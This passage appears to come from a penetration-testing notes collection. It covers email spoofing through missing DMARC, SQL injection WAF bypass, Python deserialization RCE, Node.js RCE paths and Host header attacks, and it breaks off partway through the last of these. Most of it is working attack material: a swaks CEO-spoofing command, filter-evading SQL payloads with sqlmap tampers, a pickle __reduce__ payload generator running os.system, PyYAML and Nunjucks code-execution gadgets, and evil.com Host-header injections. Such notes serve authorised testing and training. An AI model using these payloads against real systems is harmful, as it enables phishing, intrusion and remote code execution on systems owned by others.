- **DMARC** is the decider: `p=reject` blocks spoofed mail, `p=quarantine` -> spam, `p=none` (or no
  DMARC) = **spoofable to the inbox**. Note `sp=` (subdomain policy) and `pct=`.
- **DKIM** signs mail; without alignment it doesn't stop a forged `From` on its own.

## Verdict table
    No DMARC / p=none              -> spoofable (inbox likely)
    p=quarantine                   -> often lands in spam
    p=reject + SPF -all            -> hard to spoof the exact domain -> use a lookalike (dnstwist)
Lookalike/typosquat domains (`dnstwist target.com`) sidestep a locked-down domain.

## Send the test (authorised only)
    swaks --to victim@target.com --from ceo@target.com --server <MX> --body @lure.txt
(`oscp atlas swaks`.) Only against in-scope recipients with written authorisation.

## Pattern
"Read SPF/_dmarc/DKIM -> DMARC p=none/absent = spoofable; p=reject = use a lookalike domain -> send
via swaks." (See: client-side-attacks, osint-basics.)

entries.title: SQL injection WAF bypass
entries.brief: Getting an injection past a web application firewall or input filter
entries.body:
## When the payload is blocked
Your `' OR 1=1-- -` returns a 403/'malicious request'. The injection may still be there — a **WAF or filter**
is matching the signature, not fixing the bug. Reshape the payload so it's equivalent but
doesn't match.

## The techniques (combine them)
- **Case & whitespace**: `UnIoN SeLeCt`; replace spaces with comments `/**/`, `+`, `%09`/`%0a`/`%0c`,
  or parentheses: `UNION(SELECT(1),2)`.
- **Inline comments inside keywords**: `UN/**/ION SEL/**/ECT`, `/*!50000UNION*/` (MySQL versioned).
- **Encoding**: URL-encode, double-URL-encode (`%2527`), unicode, or hex for strings
  (`0x61646d696e` instead of `'admin'`), `CHAR(97,...)`.
- **Alternate syntax**: `OR 1=1` -> `OR 2>1`, `OR 'a'='a'` -> `OR 'a' LIKE 'a'`; `--` -> `#` or `;%00`.
- **No-space tricks**: scientific notation / backticks (MySQL) \`col\`, `UNION SELECT` -> use
  `UNION ALL SELECT`.
- **Logic swaps** to dodge `=`/quotes: `LIKE`, `RLIKE`, `IN`, `BETWEEN`; concat with `||`/`CONCAT`.

## Method
1. Find **which token** trips the WAF (binary-search your payload).
2. Rewrite just that token with an equivalent above.
3. Automate with **sqlmap tamper scripts**:
       sqlmap -u '<url>' --tamper=space2comment,between,charencode --random-agent
   (list: `sqlmap --list-tampers`.)

## Pattern
"403 ≠ patched. Find the blocked token -> swap for an equivalent (case/comments/encoding/alt-syntax)
-> or sqlmap --tamper." Confirm the bug still fires with a benign probe first. (See: sqli-logic,
blind-sqli, sqlmap-workflow.)

entries.title: Python deserialization — pickle, PyYAML, jsonpickle
entries.brief: Why loading untrusted serialized Python is remote code execution
entries.body:
## The bug
Several Python formats run code while **reconstructing** an object, so deserializing attacker 
data is RCE. The worst offenders:

## pickle (and cPickle, shelve, joblib)
`pickle.loads()` on untrusted bytes = instant RCE. An object's `__reduce__` returns a callable 
and args that pickle **executes** on load:
    import pickle, os, base64
    class E:
        def __reduce__(self): return (os.system, ('id',))
    print(base64.b64encode(pickle.dumps(E())).decode())   # send this where the app unpickles
Pickled data often hides in **cookies, caches, message queues, .pkl files, Flask sessions**
(if the signing key leaks). Magic bytes often start `gASV`/`\x80\x04`.

## PyYAML
`yaml.load(data)` **without** `Loader=SafeLoader` processes `!!python/object/apply` tags that 
call functions:
    !!python/object/apply:os.system ['id']
    !!python/object/apply:subprocess.check_output [['id']]
Fixed by `yaml.safe_load`; the vulnerable `yaml.load` still appears everywhere.

## jsonpickle / others
`jsonpickle.decode()` on untrusted input reconstructs arbitrary types -> RCE via the same idea. 
So can `__reduce__`-based paths in `dill`, `numpy.load(allow_pickle=True)`, and `torch.load`.

## Where to look
Cookies/tokens that base64-decode to pickle; a YAML config/API body; file uploads processed by 
`yaml.load`/`pickle.load`; ML model files; Celery/Redis task payloads.

## Pattern
"Untrusted data reaches pickle.loads / yaml.load / jsonpickle.decode -> craft a __reduce__ or 
!!python/object/apply payload -> RCE." (See: java-deserialization, dotnet-deserialization, 
php-deserialization-phar.)

entries.title: Node.js server-side RCE
entries.brief: How template injection, unsafe eval and prototype pollution reach command execution in Node apps
entries.body:
## The common Node paths to RCE
JavaScript back-ends (Express, etc.) reach code execution a few recurring ways. Fingerprint 
Node by headers (`X-Powered-By: Express`), stack traces, or behaviour, then test these.

## 1. Server-side template injection (SSTI)
Template engines that allow logic are RCE when user input is the template. Probe with `{{7*7}}` 
or engine-specific syntax (see ssti-logic):
    # Pug/Jade, EJS, Handlebars, Nunjucks all have known RCE gadgets, e.g. Nunjucks:
    {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}

## 2. Unsafe eval / Function / vm
User input reaching `eval()`, `Function()`, `vm.runInContext`, or `child_process` (exec/execSync/
spawn with a shell string) = direct injection:
    require('child_process').execSync(userInput)        // command injection
    eval(userControlledString)                          // JS injection -> require('child_process')

## 3. Prototype pollution -> RCE
Polluting `Object.prototype` (via a merge/clone of attacker JSON with `__proto__`) can inject 
properties that downstream code trusts — sometimes a template option or a spawn argument — turning 
pollution into RCE. (See: prototype-pollution.)
    {"__proto__":{"shell":"/bin/sh","argv0":"..."}}   // gadget-dependent

## 4. Deserialization
`node-serialize`'s `unserialize()` executes an IIFE in the payload (`_$$ND_FUNC$$_`): a classic 
Node deserialization RCE. Also `funcster`, `serialize-javascript` misuse.

## Pattern
"Fingerprint Node -> test SSTI ({{7*7}}), input into eval/exec, prototype pollution gadgets, and 
node-serialize -> child_process for the shell." (See: ssti-logic, command-injection-logic, 
prototype-pollution.)

entries.title: Host header attacks
entries.brief: The family of bugs that come from trusting the incoming Host (or X-Forwarded-Host) header
entries.body:
## Why the Host header is dangerous
Apps often build **absolute URLs, cache keys, routing decisions and security checks** from the 
incoming `Host` header (or `X-Forwarded-Host`, `X-Forwarded-Server`). Since you control it, a 
trusted Host becomes several distinct bugs.

## The attacks
- **Password-reset poisoning** — the reset link is built from Host, so the token emails to your 
  domain. (See: password-reset-poisoning.)
- **Web cache poisoning** — an unkeyed Host/X-Forwarded-Host reflected into the response poisons 
  the cached copy for everyone. (See: web-cache-poisoning.)
- **Routing-based SSRF** — a reverse proxy/load balancer routes by Host; a crafted Host reaches 
  internal vhosts/services (admin panels, metadata). (See: ssrf-logic, cloud-metadata-ssrf.)
- **Authentication/ACL bypass** — code that trusts `Host == internal` to grant access, bypassed 
  by setting that Host.
- **Virtual-host brute / internal apps** — fuzz Host to find hidden vhosts the IP serves.

## How to test
    # does it reflect / affect the response? (use a cache-buster first)
    GET /?cb=1 HTTP/1.1
    Host: evil.com
    # if the real Host is validated, try overrides the app may still trust:
    X-Forwarded-Host: evil.com   ·   X-Host: evil.com   ·   X-Forwarded-Server: evil.com
    # duplicate Host headers, absolute-URI request line, or Host: internal:8080

## Pattern
